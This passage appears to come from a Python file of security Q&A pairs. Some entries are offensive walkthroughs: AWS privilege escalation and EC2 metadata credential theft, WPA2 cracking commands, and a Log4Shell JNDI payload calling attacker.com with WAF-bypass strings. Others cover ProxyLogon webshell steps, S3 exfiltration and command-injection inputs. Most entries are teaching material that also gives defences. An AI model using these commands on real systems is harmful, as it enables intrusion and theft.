'''AWS penetration testing methodology: IAM enumeration (with valid credentials): aws sts get-caller-identity (who am I?); enumerate permissions: aws iam list-attached-user-policies --user-name USER; aws iam list-user-policies --user-name USER; assume-role exploration: aws iam list-roles; attempt to assume each role (some may be misconfigured to allow any authenticated user). IAM privilege escalation paths (Rhino Security Labs research): CreateNewPolicyVersion: create new version of managed policy with AdministratorAccess; SetDefaultPolicyVersion: set malicious version as default. AttachUserPolicy/AttachRolePolicy: attach AdministratorAccess to self. PassRole + CreateEC2/Lambda: pass privileged role to Lambda function; invoke Lambda = execute as that role. iam:CreateLoginProfile on accounts without MFA. S3 enumeration: aws s3 ls (list buckets); aws s3 ls s3://BUCKET (list contents); aws s3 cp s3://BUCKET/sensitive_file . (download); check for public buckets via GetBucketAcl and GetBucketPolicy. EC2 metadata: from compromised EC2 instance: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ (get IAM role name); curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME (get temporary credentials); use credentials externally. Secret Manager / Parameter Store: aws secretsmanager list-secrets; aws secretsmanager get-secret-value --secret-id NAME; aws ssm describe-parameters; aws ssm get-parameter --name NAME --with-decryption. Tools: Pacu (AWS exploitation framework by Rhino Security Labs); aws_consoler (convert CLI credentials to console session); cloudfox (cloud enumeration); enumerate_iam.py (brute-force IAM permissions).''')

p("What are common misconfigurations in Kubernetes that lead to compromise?",
'''Kubernetes misconfiguration vulnerabilities: (1) API server exposed to internet: kubectl get pods from internet = full cluster access if misconfigured; should be private or behind VPN; check: nmap -p 6443,8443 cluster-ip. (2) Anonymous access enabled: --anonymous-auth=true allows unauthenticated API requests; combined with permissive RBAC = full access without auth. (3) Dashboard without auth: Kubernetes Dashboard with --enable-skip-login or without authentication; internet-exposed = cluster takeover. (4) Privileged pods: securityContext.privileged: true gives all capabilities; mount host filesystem; escape to host. (5) hostNetwork/hostPID: pod runs in host network/PID namespace; can sniff all host network traffic; can access processes outside container. (6) Writable host path mounts: volumes.hostPath mounting /etc, /var/run/docker.sock, or /proc grants container broad host access. (7) ServiceAccount token automount: by default all pods get service account token; if pod is compromised, attacker gets token; use automountServiceAccountToken: false when not needed. (8) Over-permissive NetworkPolicy: by default no network isolation between pods; any pod can reach any other pod; implement NetworkPolicy for zero-trust between pods. (9) etcd not encrypted: etcd stores all cluster state including secrets; if etcd port 2379 accessible, read all secrets in plaintext (if encryption at rest not configured). (10) Image pull from untrusted registry: using latest tag from Docker Hub; image can be updated with malicious code; pin to digest (sha256:...). Tools: kube-bench (CIS benchmark checks); kube-hunter (active security testing); trivy k8s --report summary cluster (cluster vulnerability scan).''')

p("Explain how to enumerate and exploit Azure AD vulnerabilities.",
'''Azure AD attack surface: (1) Password spray against Azure AD authentication: use MSOLSpray, Spray365, or AzureADPasswordSpray; authenticates against login.microsoftonline.com; does not trigger on-prem AD lockout; Smart Lockout has different thresholds. (2) Enumerate users: check if email exists at Microsoft: test authentication response for AADSTS50034 (user not found) vs AADSTS50055 (valid user, password expired) vs success; UserEnumerationPrevention may block this. (3) Azure AD Connect: syncs on-prem AD to Azure AD; MSOL service account has DCSync rights on-prem AD; if Azure AD Connect server is compromised, extract MSOL account hash, perform DCSync. (4) Guest account abuse: guest users can enumerate Azure AD by default; enumerate all users, groups, applications; used for phishing prep. (5) Application permissions: service principals with Application permissions (not delegated) act without user consent; if application credential (client secret or certificate) leaked from code/environment variable: authenticate as app, exercise all granted permissions; Directory.Read.All = enumerate all users, groups, apps; Mail.Read = read all tenant email. (6) Conditional Access bypass: compliant device condition -- if attacker registers device as compliant; legacy authentication bypass -- older protocols (SMTP, IMAP, basic auth) bypass MFA. (7) OAuth consent phishing: malicious Azure AD app requesting delegated permissions; victim clicks consent; attacker has API access. (8) PRT (Primary Refresh Token) theft: from joined device via LSASS or token cache; use with ROADtoken or AADInternals to generate access tokens. Tools: AADInternals (comprehensive Azure AD exploitation); ROADtools (Azure AD enumeration and token manipulation); Hawk (Microsoft cloud forensics).''')

# ── THREAT INTELLIGENCE ────────────────────────────────────────────────────────

p("How do you build and use a threat intelligence program?",
'''Threat intelligence program: collect, analyse, and distribute actionable information about adversary TTPs, IOCs, and threat actors. Intelligence types: (1) Strategic: high-level trends, industry targeting; for CISO and board; example: ransomware groups targeting healthcare sector increased 87% in past year. (2) Operational: specific campaigns and attacker infrastructure; for SOC managers; example: APT29 phishing campaign targeting government using specific lure themes. (3) Tactical: TTPs (Techniques, Tactics, Procedures) mapped to MITRE ATT&CK; for detection engineers; example: threat actor uses T1566.001 Spearphishing Attachment with .xlsm files. (4) Technical: IOCs (IPs, domains, hashes, URLs); for SOC analysts and security tools; example: C2 IP 1.2.3.4, malware hash abc123. Sources: commercial feeds (Recorded Future, Mandiant, CrowdStrike Intel -- high signal, curated, expensive); open-source (AlienVault OTX, MISP communities, Abuse.ch, Emerging Threats, URLhaus, MalwareBazaar); government (CISA, FBI Flash alerts, NCSC); ISAC (Information Sharing and Analysis Center -- sector-specific sharing: FS-ISAC for finance, H-ISAC for healthcare). Operationalisation: ingest IOCs into SIEM (auto-blocklist for high-confidence, alert-only for medium); enrich alerts with threat intel context; TIP (Threat Intelligence Platform) for aggregation and normalisation; MISP for sharing and correlation; STIX/TAXII format for structured sharing. Lifecycle: direction (what are we trying to learn?) -- collection -- processing (parsing, deduplication) -- analysis (context, relevance) -- dissemination (to right audience in right format) -- feedback.''')

p("Explain the MITRE ATT&CK framework and how to use it.",
'''MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge): knowledge base of real adversary behaviors organised by tactic (goal) and technique (how). Structure: Tactics (14 for Enterprise): Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, Impact. Techniques: each tactic has techniques; techniques have sub-techniques; each has ID (T1566.001 = Phishing: Spearphishing Attachment), description, procedure examples (real APT use), detection guidance, mitigation guidance. Use cases: (1) Threat intelligence: map threat actor TTPs to ATT&CK; APT29 heat map shows which techniques they use; prioritise defenses against likely threats. (2) Detection engineering: use technique detection guidance to write SIEM rules; ATT&CK-mapped detections show coverage gaps. (3) Red team planning: design exercises covering techniques specific threat actors use; ATT&CK Navigator to plan and track. (4) Purple team: run each technique; verify detection fires; close gaps; track coverage on Navigator heat map. (5) SOC metrics: what percentage of ATT&CK techniques do we detect? Which tactics have coverage gaps? (6) Incident reporting: map observed attacker actions to ATT&CK IDs; standardised language across teams and organisations. ATT&CK Navigator: web tool to create heat maps showing detected vs undetected techniques; colour-code by detection confidence; layer multiple threat actors; export for reporting. Related: ATT&CK for ICS (industrial control systems); ATT&CK for Mobile; D3FEND (defensive techniques framework).''')

p("What is threat hunting and how do you conduct a hunt?",
'''Threat hunting: proactive search for threats that evaded automated detection; assumes adversary already in environment. Differs from incident response: IR is reactive (alert triggered); hunting is proactive (no alert -- searching for unknown threats). Types: (1) IOC-based hunt: search for known malicious IOCs across environment; limited to known threats; good for validating intel. (2) TTP-based hunt: search for adversary behaviors regardless of specific IOCs; detects unknown threat actors using known techniques. (3) Anomaly-based: statistical deviation from baseline; unusual processes, traffic, user behavior. Hunt hypothesis: start with a hypothesis: "An adversary is using WMI event subscriptions for persistence"; drives what data to query and what to look for. Data sources: SIEM logs (Windows events, Sysmon, network flows, DNS); EDR (process creation trees, file system changes, registry changes, network connections); PCAP (full packet capture); cloud API logs (CloudTrail). Hunt execution example (WMI persistence hunt): query for Sysmon Event 19 (WmiEventFilter creation) and Event 20 (WmiEventConsumer creation) across 90-day window; exclude known-good baselines (IT management tools); investigate any anomalies. Tooling: Splunk SPL or Elastic KQL for SIEM queries; Jupyter notebooks for statistical analysis; Velociraptor for endpoint artifact collection at scale; HELK (Hunting ELK) for community hunting environment. Outputs: detections written for found threats; new IOCs added to blocking; missed detections identified and written as SIEM rules; improved baseline understanding. Hunting maturity: Level 0 (rely on tools) to Level 4 (automated hunting pipelines).''')

# ── WIRELESS SECURITY ──────────────────────────────────────────────────────────

p("How do you attack WPA2 enterprise networks?",
'''WPA2 Enterprise uses 802.1X with RADIUS server for authentication; each user has individual credentials (unlike WPA2-PSK with shared key). Attack surfaces: (1) Evil twin attack: create rogue AP with same SSID and 802.1X; use hostapd-wpe (Wireless Pwnage Edition) or EAPHammer; clients connect to evil twin; attempt EAP authentication; evil twin captures MSCHAPV2 challenge-response (NTLMv2 hash); crack offline with asleap or john. (2) EAP type downgrade: if client accepts PEAP-MSCHAPv2 but also accepts weaker EAP types; configure evil twin to offer weaker EAP; extract credentials. (3) Certificate validation bypass: PEAP wraps MSCHAPv2 in TLS tunnel; if client does not validate server certificate (common misconfiguration), evil twin presents self-signed cert; client accepts; credentials captured in tunnel. (4) PMKID attack: for WPA2-PSK networks, capture PMKID from single frame without deauthenticating clients: hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1; extract PMKID: hcxpcapngtool capture.pcapng -o hash.22000; crack: hashcat -m 22000 hash.22000 wordlist.txt. (5) KARMA attack: Android/iOS probe for known network names; rogue AP responds to all probes; clients auto-connect. Tools: hostapd-wpe; EAPHammer; airbase-ng; hostapd with configuration. Defense: validate server certificate and pin to specific CA/certificate; use EAP-TLS (certificate-based client auth -- no password to steal); disable weaker EAP types; WPA3 Enterprise with 192-bit security.''')

p("How do you crack WPA2 PSK passwords?",
'''WPA2-PSK cracking: capture 4-way EAPOL handshake then crack offline. Step 1 -- capture handshake: put adapter in monitor mode: airmon-ng start wlan0; scan: airodump-ng wlan0mon; target specific AP: airodump-ng -c CHANNEL --bssid TARGET_BSSID -w capture wlan0mon; deauthenticate client to force reconnection and capture handshake: aireplay-ng -0 1 -a BSSID -c CLIENT_MAC wlan0mon; wait for EAPOL handshake in airodump-ng output. Step 2 -- crack: convert to hashcat format: hcxpcapngtool capture.cap -o hash.22000; dictionary attack: hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt; rules-based: hashcat -m 22000 hash.22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule; mask attack (8-digit phone number): hashcat -m 22000 hash.22000 -a 3 ?d?d?d?d?d?d?d?d; hybrid (wordlist + mask -- word + 4 digits): hashcat -m 22000 hash.22000 -a 6 rockyou.txt ?d?d?d?d. PMKID attack (no handshake needed): hcxdumptool captures PMKID from AP beacon; works without any clients connected; hashcat -m 22000. Speed: RTX 4090 cracks WPA2 at ~700,000 hashes/second; 8-char lowercase = 26^8 = 208 billion combos = 3.5 days; with GPU cluster (vast.ai), much faster. WPA3 SAE (Simultaneous Authentication of Equals): forward-secret; PSK not directly used in handshake derivation; dictionary attack much slower (no offline cracking -- must interact with AP for each guess). Defense: passphrase > 20 characters with random characters; avoid dictionary words; use WPA3 if available.''')

p("What is 802.1X and how can it be bypassed?",
'''802.1X is IEEE standard for port-based Network Access Control (NAC); authenticates devices before granting network access. Components: Supplicant (client device with 802.1X software); Authenticator (network switch/AP with 802.1X enforcement); Authentication Server (RADIUS server that validates credentials). EAP methods: EAP-TLS (mutual certificate authentication -- most secure); PEAP-MSCHAPv2 (server certificate + user credentials in TLS tunnel -- common); EAP-MD5 (weak, deprecated -- no server auth). Bypass techniques: (1) MAC spoofing: some networks use MAB (MAC Authentication Bypass) for devices that cannot do 802.1X (printers, cameras); whitelist of MAC addresses; spoof a whitelisted MAC to bypass 802.1X entirely; discover whitelisted MACs from ARP tables or physical device inspection. (2) Piggyback on authenticated session: connect unmanaged hub between authenticated device and switch port; switch sees authenticated MAC from legitimate device; attacker on hub gets network access; MAC flooding can confuse switch. (3) VLAN hopping: if guest VLAN accessible, use VLAN hopping (double-tag or DTP trunk negotiation) to reach corporate VLAN. (4) EAPOL logoff injection: send EAPOL-Logoff frame spoofed as authenticated client to disconnect them; attacker plugs in during gap. (5) Certificate bypass (if no client cert validation): if RADIUS does not verify client certificate or uses weak validation, forge certificate. (6) RADIUS server attack: compromise RADIUS server; grant access to any device. Defense: require EAP-TLS with client certificates (not just server validation); disable MAB where possible; use posture assessment (NAC checks for antivirus, patch level); monitor for rogue 802.1X attempts.''')

# ── ADVANCED EXPLOITATION ──────────────────────────────────────────────────────

p("How do you exploit Log4Shell (CVE-2021-44228)?",
'''Log4Shell: critical RCE in Apache Log4j (Java logging library) affecting versions 2.0-beta9 to 2.14.1. CVSS 10.0 (maximum). Vulnerability: Log4j performs JNDI lookups in log messages; if user-controlled data is logged: log.info("Login attempt: " + username); attacker sends username=${jndi:ldap://attacker.com/exploit}; Log4j parses JNDI reference; connects to attacker LDAP server; loads remote Java class; executes arbitrary code. Exploitation: (1) Set up JNDI exploit server: marshalsec or ysoserial JNDI redirect server; or use JNDI-Exploit-Kit / log4shell-detector infrastructure. (2) Host malicious Java class: compile payload class (ReverseShell.class); serve via HTTP on attacker infrastructure. (3) Inject payload: find any input that gets logged (User-Agent header, username, search query, API parameters): curl -H "User-Agent: ${jndi:ldap://attacker.com:1389/exploit}" https://target.com/. (4) JNDI lookup: target connects to attacker LDAP; LDAP redirects to HTTP URL of malicious .class file; target downloads and executes class = RCE. Bypasses: WAFs blocking ${jndi:ldap://}: ${${lower:j}ndi:ldap://}; ${${::-j}${::-n}${::-d}${::-i}:ldap://}; ${jndi:${lower:ldap}://}; nested: ${${::-j}ndi:ldap://}. Post-exploitation: Log4j runs in JVM context; spawn shell with runtime.exec(); may run as privileged service account. Patching: upgrade to Log4j 2.17.1+; add -Dlog4j2.formatMsgNoLookups=true JVM argument; remove JndiLookup.class from classpath.''')

p("How do you exploit ProxyLogon (CVE-2021-26855) in Microsoft Exchange?",
'''ProxyLogon: pre-authentication SSRF in Microsoft Exchange Server enabling authentication bypass and RCE. CVE-2021-26855 (SSRF) + CVE-2021-27065 (post-auth arbitrary file write) = unauthenticated RCE. Affected: Exchange Server 2013, 2016, 2019 (before March 2021 patches). CVE-2021-26855 detail: Exchange Client Access Service proxies requests to backend Exchange services using cookies; X-AnonResource-Backend header specifies backend URL; attacker forges backend URL to reach Exchange backend with a crafted cookie that bypasses authentication. SSRF achieves authentication as any user including Administrator. CVE-2021-27065 detail: after authentication as admin, the New-ExchangeCertificate cmdlet allows writing files to arbitrary paths on disk; write a webshell to Exchange web directory (C:\inetpub\wwwroot\aspnet_client\). Full chain: authenticate via SSRF (26855) as admin; write aspx webshell via file write (27065); execute commands via webshell. Tools: proxylogon.py (exploit script); published PoC on GitHub shortly after disclosure. Detection: look for suspicious OAB (Offline Address Book) virtualDirectory changes in Exchange audit logs; aspx files in \aspnet_client\ or Exchange frontend directories; network connections from Exchange server to external IPs; IIS logs showing POST requests to unusual paths. Incident response: this was heavily exploited by Hafnium APT; look for multiple webshells in standard paths; run Exchange Hafnium detection script from Microsoft.''')

p("What is heap exploitation and what common techniques exist?",
'''Heap exploitation: attack the dynamic memory allocator to corrupt heap metadata or data, leading to arbitrary read/write. Heap basics: malloc() allocates chunks; each chunk has metadata (size, prev_in_use flags); free() returns chunk to freelist (bins); next malloc of same size returns from bin. Use-After-Free (UAF): access memory after free(); dangling pointer still points to freed chunk; allocate new object in same chunk; old code reads/writes new object contents; type confusion or controlled data in freed location. Double Free: free same pointer twice; corrupts freelist; next allocation returns same address twice; two objects occupy same memory. Heap overflow: write past end of heap chunk; overwrite metadata of next chunk (size field, forward/backward pointers in freelist). Techniques: (1) tcache poisoning (glibc 2.26+): tcache (thread-local cache) is a single-linked list; no security checks (no safe-unlink); overwrite fd pointer in freed chunk; next malloc returns attacker-chosen address; write arbitrary data. (2) Fastbin attack: similar to tcache but fastbin has partial checks; overwrite fd pointer; allocate twice; return to arbitrary address. (3) Unsafe unlink: overflow to corrupt chunk prev_size and prev_in_use; trigger free of next chunk; coalesce overwrites arbitrary memory via FD->bk = BK, BK->fd = FD. (4) House of Orange: create chunk overlapping top chunk; reduce top chunk size; force malloc to create new heap segment; exploit. Tools: pwndbg (heap visualization: vis_heap_chunks, heap, bins); GEF; pwntools for exploit scripting.''')

# ── INCIDENT RESPONSE ─────────────────────────────────────────────────────────

p("What is the incident response lifecycle and how do you manage a major incident?",
'''Incident Response (IR) lifecycle (NIST SP 800-61): (1) Preparation: build IR capability before incidents happen; document IR plan and playbooks; assemble IR team; deploy logging and monitoring; establish communication channels and external contacts (legal, PR, law enforcement, forensics vendor). (2) Detection and Analysis: alert fires (SIEM, EDR, threat hunt); analyst investigates: is this a true positive or false positive? If TP: what is the scope? Which systems affected? What data potentially compromised? Initial severity classification: P1 (business-critical systems, data breach) to P4 (minor). (3) Containment: prevent spread; short-term (isolate affected host from network -- EDR network isolation, VLAN change); long-term (patch vulnerable systems, reset compromised credentials); evidence preservation (forensic image before containment if possible). (4) Eradication: remove attacker from environment; delete malware, backdoors, webshells; close all persistence mechanisms (scheduled tasks, registry keys, new accounts); reset all compromised credentials (not just the obvious ones); change krbtgt password twice if domain compromise suspected. (5) Recovery: restore systems from clean backups; harden before reconnecting; monitor closely for reinfection; phased restoration (least critical first). (6) Post-Incident Activity: lessons learned meeting within 2 weeks; root cause analysis; what detection failed, what response worked; update playbooks; detection improvements implemented. War room management: Incident Commander coordinates; separate channels for technical (forensics), management (status updates), legal/comms; timeline document tracks all findings; brief executive team at defined intervals; legal hold for relevant logs and evidence.''')

p("How do you perform digital forensics on a compromised Windows system?",
'''Windows forensics methodology: (1) Evidence acquisition: forensic image full disk (FTK Imager, dd, dcfldd); preserve volatile data first (memory): WinPmem, Magnet RAM Capture; document chain of custody; write-block physical drives if possible; cloud forensics: snapshot EC2 instance, image snapshot in new environment. (2) Memory analysis: Volatility framework: python3 vol.py -f memory.raw windows.pslist (running processes); windows.cmdline (command lines of processes); windows.netscan (network connections); windows.malfind (injected code, suspicious memory regions with execute permissions); windows.dlllist (loaded DLLs); windows.handles (open files and keys). (3) Registry analysis: SYSTEM hive: services (HKLM\SYSTEM\CurrentControlSet\Services -- look for new services); hardware history. SOFTWARE hive: installed programs, autorun locations. NTUSER.DAT (per user): MRU lists (recently opened files), UserAssist (programs run), shell bags (folder access history), recent documents. Malware persistence: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run (auto-start). (4) Event log analysis: Security log: 4624 (logons), 4625 (failed logons), 4648 (explicit credential logon), 4688 (process creation if audited), 4698 (scheduled task), 7045 (service install). System log: 7034/7036 (service state changes). PowerShell: 4103 (module logging), 4104 (script block). (5) File system: $MFT parsing (all file activity, timestamps); prefetch files (C:\Windows\Prefetch -- evidence of program execution); browser history, downloads; LNK files (recent files accessed). (6) Timeline: create super-timeline with Plaso/log2timeline combining all artifacts into chronological view for reconstruction.''')

p("How do you respond to a ransomware incident?",
'''Ransomware incident response: (1) Immediate triage (first 15 minutes): identify affected systems (network IOC check, endpoint reports, user reports); determine type (known ransomware family? check ransom note, encrypted extension, ID Ransomware website); is encryption ongoing? (high CPU, rapid file modification events); isolate immediately -- do not wait for full analysis. (2) Containment: network isolation of all affected systems (EDR network isolation, firewall block, VLAN change); DO NOT shut down systems if possible (memory may contain decryption key or encryption key information, also delete shadow copies may still be running); kill ransomware process if identified (safer than full power off); disable admin shares (net share C$ /delete); block lateral movement paths at firewall. (3) Eradication: identify patient zero (first infected system); determine initial access vector (phishing email, RDP brute force, vulnerability exploitation); find all persistence (scheduled tasks, registry, new accounts, deployed tools); remove all attacker footholds before recovery (they will ransomware again if not fully evicted). (4) Recovery: check backup integrity BEFORE restoring (verify backups are clean and not encrypted); restore from offline/immutable backups; if no clean backups: law enforcement (FBI, CISA) may have decryptors for some families (NoMoreRansom.org); paying ransom (last resort, no guarantee, legal considerations for OFAC-sanctioned groups). (5) Post-incident: root cause analysis; MFA rollout; privileged access review; offline/immutable backup implementation; EDR and email security hardening; tabletop exercise for next ransomware scenario.''')

p("What is the chain of custody in digital forensics and why does it matter?",
'''Chain of custody: documented record of who had access to evidence, when, and what was done with it; ensures evidence integrity and admissibility in legal proceedings. Why it matters: if chain of custody is broken, defense can argue evidence was tampered with, making it inadmissible in court; even for internal investigations, proper documentation supports HR actions and demonstrates due process. Elements of chain of custody documentation: evidence item description (device make, model, serial number, hard drive size, hash); acquisition details (date, time, location, acquiring analyst, method used, tool and version); cryptographic hash (MD5 or SHA-256 of acquired image -- proves no modification); storage location and access log (who removed from evidence storage, for what purpose, when returned); each transfer of custody documented with signatures. Acquisition best practices: write-block physical drive before imaging to prevent accidental modification; FTK Imager or dcfldd for forensic image; verify hash after imaging (source hash must match image hash); label evidence with unique case number and item number; use tamper-evident bags for physical media. Chain of custody for volatile data: memory forensics tools (WinPmem) record timestamp, system information, analyst; memory hash computed immediately after acquisition. Documentation: evidence tracking spreadsheet or case management system (Autopsy, EnCase, FTK); litigation hold notice preserves original data; maintain until statute of limitations expires. Expert witness testimony: forensic analyst must be able to testify about every step; any gap in documentation undermines testimony.''')

# ── SECURE CODING ─────────────────────────────────────────────────────────────

p("How do you implement secure session management?",
'''Secure session management prevents session hijacking and fixation attacks. Session ID properties: cryptographically random (128+ bits from CSPRNG -- /dev/urandom, secrets.token_urlsafe(32) in Python, SecureRandom in Java); sufficient entropy prevents brute-force guessing. Session token transmission: use HttpOnly cookie (prevents JavaScript access -- mitigates XSS token theft); use Secure flag (only sent over HTTPS); use SameSite=Strict or SameSite=Lax (prevents CSRF); do not put session ID in URL (logged in server logs, Referer headers, browser history). Session lifecycle: generate new session ID on login (prevent session fixation -- attacker sets session ID before login, victim logs in with attacker session = authenticated session); invalidate old session; timeout inactive sessions (15-30 minutes for sensitive apps, configurable); absolute timeout (even active sessions expire after 8-24 hours -- requires re-auth); provide logout that truly invalidates server-side session (delete from session store, not just clear cookie). Session storage: server-side storage (database or Redis) with session data keyed to session ID; do not store sensitive data in cookie (even encrypted -- key rotation is difficult); JWT as stateless session has tradeoffs (cannot invalidate individual tokens without blocklist). Concurrent session handling: limit concurrent sessions per user; notify user of new login from different location; allow user to see and terminate other sessions. Implementation: use established session management from frameworks (Flask-Session, Spring Session, Express-Session) rather than building custom; frameworks handle ID generation, storage, and expiry correctly.''')

p("How do you prevent command injection vulnerabilities?",
'''Command injection: user input passed to system shell commands; attacker injects additional commands. Vulnerable pattern (Python): import subprocess; result = subprocess.run("ping " + user_input, shell=True); attacker sends user_input=8.8.8.8; ls -la and ping command executes plus ls -la. Prevention: (1) Avoid shell=True: use list form to pass arguments directly: subprocess.run(["ping", user_input]) -- no shell interpretation; user_input cannot inject additional commands when passed as argument. (2) Allowlist validation: if input must be a hostname, validate: import re; if not re.match(r"^[a-zA-Z0-9.-]+$", user_input): raise ValueError("Invalid hostname"). (3) Avoid shell entirely: use native library equivalents: instead of os.system("nmap -p 80 " + host), use python-nmap library or socket API. Language-specific: PHP: escapeshellarg() wraps argument in single quotes and escapes internal single quotes; escapeshellcmd() escapes shell metacharacters -- but prefer exec($cmd, $args) without shell. Java: ProcessBuilder with argument list (not String command with shell); Runtime.exec(String[] cmdarray) not exec(String cmd). Node.js: child_process.execFile(command, [args]) instead of exec(string); spawn with array of arguments. Testing: inject: ; whoami, | id, && cat /etc/passwd, $(id), `id`, %0A whoami (URL-encoded newline). OWASP: command injection ranked in OWASP Top 10; A03:2021-Injection; use SAST tools (Bandit for Python, Semgrep rules) to detect vulnerable patterns in CI.''')

p("What are secure coding practices for cryptography?",
'''Cryptography secure coding: use established libraries, never implement your own crypto. Key principles: (1) Use standard libraries: Python: cryptography library (pyca/cryptography); Java: JCE with Bouncy Castle provider; Node.js: crypto module (built on OpenSSL); avoid implementing AES, RSA, or ECDSA from scratch -- correct implementation is extremely difficult. (2) Symmetric encryption: use AES-256-GCM (Authenticated Encryption with Associated Data -- AEAD); provides both confidentiality and integrity; always use random IV/nonce (96 bits for GCM); never reuse nonce with same key (catastrophic for GCM); key derivation: use PBKDF2 (600,000 iterations, SHA-256), bcrypt (cost factor 12+), or Argon2id for password-based key derivation. (3) Asymmetric encryption: RSA minimum 2048 bits (prefer 4096 or ECDSA); use OAEP padding for RSA encryption (never PKCS#1 v1.5 -- vulnerable to padding oracle); for signatures: ECDSA with P-256 or Ed25519. (4) Hashing: SHA-256 or SHA-3 for general hashing; bcrypt, Argon2id, scrypt for passwords (NOT plain SHA or MD5); never store passwords as plain SHA-256 hash (rainbow tables, fast GPU cracking). (5) Random numbers: use CSPRNG: secrets module (Python), SecureRandom (Java), crypto.randomBytes() (Node.js); never use math.random() or random.random() for security-sensitive values (session IDs, tokens, nonces). (6) Key management: store keys in HSM or key management service (AWS KMS, HashiCorp Vault); never hardcode keys in source code; rotate keys regularly; separate keys per environment.''')

p("How do you implement input validation and output encoding?",
'''Input validation and output encoding are the primary defenses against injection attacks. Input validation: validate ALL untrusted input (user input, API responses, file contents, environment variables); allowlist approach (define what is valid): string: regex pattern, max length, allowed characters; integer: min/max range, parse to int and reject non-numeric; email: RFC-compliant regex; file: extension whitelist, MIME type check, max size; reject anything that does not match expected format. Validation vs sanitisation: prefer validation (reject invalid input) over sanitisation (try to fix invalid input); sanitisation is complex and often incomplete; if must sanitise, use well-tested libraries (OWASP Java Encoder, DOMPurify for HTML). Output encoding: encode output for the context where it will be placed to prevent injection. HTML context: HTML entity encode: < to &lt;, > to &gt;, & to &amp;, " to &quot;, to &#x27;; prevents XSS; use OWASP Java Encoder: Encode.forHtml(untrustedData). JavaScript context: encode for JS string: \\ to \\\\, " to \", newline to \n; use Encode.forJavaScript() or JSON.stringify(). URL context: URL-encode: urlencode() (PHP), urllib.parse.quote() (Python); prevents open redirect and parameter injection. SQL context: use parameterised queries (prepared statements) -- the ONLY reliable defense against SQLi; never concatenate user input into SQL. Shell context: avoid shell; if unavoidable, use argument list form (not shell=True). LDAP context: escape LDAP special characters: (, ), *, \, NUL; use LDAP safe string libraries. CSS context: never put user data in CSS (style injection enables clickjacking, keylogging via CSS selectors).''')

p("What is Content Security Policy and how do you implement it properly?",
'''Content Security Policy (CSP): HTTP response header that instructs browser which sources are trusted for loading resources; primary defense against XSS. Key directives: default-src (fallback for all resource types not explicitly set); script-src (JavaScript sources); style-src (CSS sources); img-src (image sources); connect-src (fetch, XHR, WebSocket endpoints); font-src; frame-src (iframes); object-src (plugins); base-uri (base element -- prevent base tag injection). Strict CSP (nonce-based, recommended): script-src nonce-RANDOM_VALUE strict-dynamic; nonce is a unique random value per response: import secrets; nonce = secrets.token_urlsafe(16); set CSP header with this nonce; add nonce attribute to every inline script tag: <script nonce="VALUE">; strict-dynamic trusts scripts loaded by trusted inline scripts (removes need to whitelist CDN URLs); eliminates most injection vectors. Hash-based alternative: sha256-BASE64_HASH in script-src; hash of exact script content; works for static inline scripts. Implementing: start with CSP report-only mode: Content-Security-Policy-Report-Only: policy; report-uri /csp-report-endpoint; collect violations without blocking; fix violations (inline scripts: add nonce; external scripts: add to allowlist); switch to enforcement mode. Common mistakes: unsafe-inline defeats inline XSS protection (use nonces instead); script-src with CDN wildcard (*.cloudflare.com -- JSONP endpoints on CDN bypass CSP); missing object-src none (Flash/plugin injection); missing base-uri (base tag injection); not setting frame-ancestors (clickjacking). Test with CSP Evaluator; Google CSP with strict-dynamic guide.''')

# ── ADDITIONAL TOPICS ─────────────────────────────────────────────────────────

p("How do you identify and exploit misconfigured S3 buckets?",
'''S3 bucket misconfiguration discovery and exploitation: Discovery: Google dorking: site:s3.amazonaws.com COMPANY; site:s3-us-east-1.amazonaws.com; in Burp traffic look for S3 URLs; check Wayback Machine for S3 references; GitHub dorking: org:company s3.amazonaws.com OR amazonaws.com; tools: S3Scanner (scan list of bucket names); BucketFinder; cloud_enum. Bucket name guessing: company-name, company-name-backup, company-name-data, company-name-static, company-name-assets, company-prod-backup, company-dev, company-staging; combine with company name + common suffixes. Testing access: aws s3 ls s3://BUCKET-NAME --no-sign-request (unauthenticated check); aws s3 ls s3://BUCKET-NAME (authenticated, shows if you have list permission); GetBucketAcl via API to check public permissions. Exploitation if public: aws s3 cp s3://BUCKET-NAME/sensitive-file . --no-sign-request; aws s3 sync s3://BUCKET-NAME . --no-sign-request (download entire bucket); look for: database backups (.sql, .bak), configuration files (.env, config.json, secrets.json), private keys (.pem, .key), source code archives (.zip, .tar.gz), credential files, user data. Write access: aws s3 cp malicious-file.html s3://BUCKET/ --no-sign-request; if bucket hosts website = stored XSS or phishing page; upload webshell if server executes; modify JS files for client-side supply chain attack. Reporting impact: demonstrate impact beyond just list access; download a sensitive file; show blast radius. Remediation: enable S3 Block Public Access at account level; remove public ACLs and bucket policies granting public access; use presigned URLs for temporary access; enable access logging on all buckets.''')

p("What is the difference between authentication and authorization vulnerabilities?",
'''Authentication: verifying WHO you are (identity); vulnerabilities: broken login (no account lockout, weak passwords allowed, credential stuffing), MFA bypass, session token prediction, JWT algorithm confusion. Authorization: verifying WHAT you are allowed to do (access control); vulnerabilities: IDOR, privilege escalation, missing function-level access control. Authentication vulnerabilities: (1) No account lockout: brute-force login endpoint; no captcha, no rate limiting, no lockout after N failures; test with Hydra or Burp Intruder. (2) Username enumeration: different error messages for invalid username vs invalid password; response time difference (hash computation only for valid usernames in some implementations); use same error message regardless of failure reason. (3) Credential stuffing: use HaveIBeenPwned breach database; test leaked email:password combinations; effective because 60%+ users reuse passwords. (4) MFA bypass: directly request /dashboard after providing correct username and password without completing MFA step (MFA check only on /verify-otp endpoint, not enforced by middleware on all protected routes); backup codes without rate limiting; SIM swapping to intercept SMS OTP. Authorization vulnerabilities: (1) Horizontal privilege escalation: user A accesses user B resources (IDOR); same privilege level, different user. (2) Vertical privilege escalation: regular user accesses admin function; change role=user to role=admin in request; access /admin/ without admin check. (3) Path traversal to admin: /api/v1/admin accessible without auth check despite login required. Testing: use two accounts; test all endpoints from non-privileged account; use Autorize Burp extension to replay all requests as lower-privilege user automatically.''')

p("Explain OWASP Top 10 2021 and how to test for each category.",
